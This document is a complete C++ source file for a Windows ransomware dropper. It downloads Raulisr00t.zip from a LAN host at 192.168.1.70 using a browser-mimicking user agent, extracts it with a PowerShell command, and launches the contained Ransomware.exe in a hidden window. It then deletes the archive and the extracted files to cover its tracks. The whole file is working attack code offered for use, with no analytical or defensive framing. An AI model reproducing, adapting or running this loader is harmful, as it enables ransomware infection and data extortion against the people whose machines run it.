#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <fstream>
#include <string>
#include <urlmon.h>
#include <shlobj.h>
#include <shlwapi.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib,"urlmon.lib")

using namespace std;

BOOL DownloadFileFromServer(IN string Url, OUT string& sFilePath) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResults = FALSE;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;

    LPSTR pszOutBuffer;
    URL_COMPONENTS urlComp;

    wchar_t hostName[256] = L"";
    wchar_t urlPath[256] = L"";

    INTERNET_PORT port;

    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);

    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = sizeof(hostName) / sizeof(hostName[0]);

    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = sizeof(urlPath) / sizeof(urlPath[0]);

    wstring wideUrl = wstring(Url.begin(), Url.end());

    if (!WinHttpCrackUrl(wideUrl.c_str(), (DWORD)wideUrl.length(), 0, &urlComp)) {
        cerr << "[!] Error in WinHttpCrackUrl" << endl;
        cerr << "[!] Error:" << GetLastError() << endl;
        return FALSE;
    }

    port = urlComp.nPort;

    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    if (hSession)
        hConnect = WinHttpConnect(hSession, hostName, port, 0);

    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", urlComp.lpszUrlPath,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            urlComp.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);

    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);

    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    if (bResults) {
        ofstream outfile("Raulisr00t.zip", ios::binary);

        do {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                cerr << "[!] Error in WinHttpQueryDataAvailable" << endl;
                cerr << "[!] Error:" << GetLastError() << endl;
                return FALSE;
            }

            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer) {
                cerr << "[!] Out of memory" << endl;
                dwSize = 0;
                return FALSE;
            }

            ZeroMemory(pszOutBuffer, dwSize + 1);

            if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                dwSize, &dwDownloaded)) {
                cerr << "[!] Error in WinHttpReadData" << endl;
                cerr << "[!] Error:" << GetLastError() << endl;
                return FALSE;
            }

            outfile.write(pszOutBuffer, dwDownloaded);

            delete[] pszOutBuffer;

        } while (dwSize > 0);

        outfile.close();
        sFilePath = "Raulisr00t.zip";
    }

    if (!bResults) {
        cerr << "[!] Error occurred. Code: " << GetLastError() << endl;
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return bResults;
}

BOOL ExtractZipFile(IN string zipFilePath, IN string destFolder) {
    wstring wideZipFilePath = wstring(zipFilePath.begin(), zipFilePath.end());
    wstring wideDestFolder = wstring(destFolder.begin(), destFolder.end());

    // Create the destination folder if it doesn't exist
    if (!PathFileExists(wideDestFolder.c_str())) {
        if (!CreateDirectory(wideDestFolder.c_str(), NULL)) {
            cerr << "[!] Failed to create destination folder" << endl;
            cerr << "[!] Error:" << GetLastError() << endl;
            return FALSE;
        }
    }

    // Construct the PowerShell command
    wstring command = L"powershell.exe -Command \"Expand-Archive -Path '" + wideZipFilePath + L"' -DestinationPath '" + wideDestFolder + L"' -Force\"";

    // Set up the process info
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Create the process to run the PowerShell command
    if (!CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        cerr << "[!] Failed to execute PowerShell command for extraction" << endl;
        cerr << "[!] Error:" << GetLastError() << endl;
        return FALSE;
    }

    // Wait for the extraction process to complete
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return TRUE;
}

string GetFullPath(const string& relativePath) {
    char fullPath[MAX_PATH];
    if (_fullpath(fullPath, relativePath.c_str(), MAX_PATH) != NULL) {
        return string(fullPath);
    }
    else {
        cerr << "[!] Failed to get the full path for: " << relativePath << endl;
        return "";
    }
}

void DeleteFilesAndDirectories(const string& filePath) {
    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA((filePath + "\\*").c_str(), &findFileData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            const string fileOrDirName = findFileData.cFileName;
            if (fileOrDirName != "." && fileOrDirName != "..") {
                string fullPath = filePath + "\\" + fileOrDirName;

                if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    DeleteFilesAndDirectories(fullPath);  // Recursively delete directories
                    RemoveDirectoryA(fullPath.c_str());
                }
                else {
                    DeleteFileA(fullPath.c_str());  // Delete files
                }
            }
        } while (FindNextFileA(hFind, &findFileData) != 0);
        FindClose(hFind);
    }

    RemoveDirectoryA(filePath.c_str());  // Delete the main directory
}

int main(int argc, char* argv[]) {
    string url = "http://192.168.1.70/Raulisr00t.zip";
    string zipFilePath;

    // Download the file
    if (!DownloadFileFromServer(url, zipFilePath)) {
        cerr << "[!] File cannot be downloaded [!]" << endl;
        return -1;
    }

    // Extract the file
    string destFolder = ".\\Extracted";
    if (!ExtractZipFile(zipFilePath, destFolder)) {
        cerr << "[!] Failed to extract ZIP file [!]" << endl;
        return -1;
    }

    cout << "[+] File downloaded and extracted successfully [+]" << endl;
    cout << "[>>] PRESS <Enter> To Run Extracted Exe File ..." << endl;
    getchar();

    // Construct the relative path to the executable
    string relativeExePath = destFolder + "\\Raulisr00t\\Ransomware.exe";

    // Get the full absolute path
    string fullExePath = GetFullPath(relativeExePath);

    if (fullExePath.empty() || !PathFileExistsA(fullExePath.c_str())) {
        cerr << "[!] Ransomware.exe not found at expected location: " << fullExePath << endl;
        return -1;
    }

    // Execute the extracted Ransomware.exe
    HINSTANCE result = ShellExecuteA(NULL, "open", fullExePath.c_str(), NULL, NULL, SW_HIDE);

    if ((int)result <= 32) {
        cerr << "[!] Failed to execute Ransomware.exe. Error code: " << (int)result << endl;
        return -1;
    }
    else {
        cout << "[+] Successfully launched Ransomware.exe [+]" << endl;
    }

    // Delete the downloaded ZIP file
    if (!DeleteFileA(zipFilePath.c_str())) {
        cerr << "[!] Failed to delete ZIP file. Error code: " << GetLastError() << endl;
    }
    else {
        cout << "[+] ZIP file deleted successfully [+]" << endl;
    }

    // Delete the extracted files and directories
    DeleteFilesAndDirectories(destFolder);

    cout << "[>>] PRESS <Enter> To Exit ..." << endl;
    getchar();

    return 0;
}
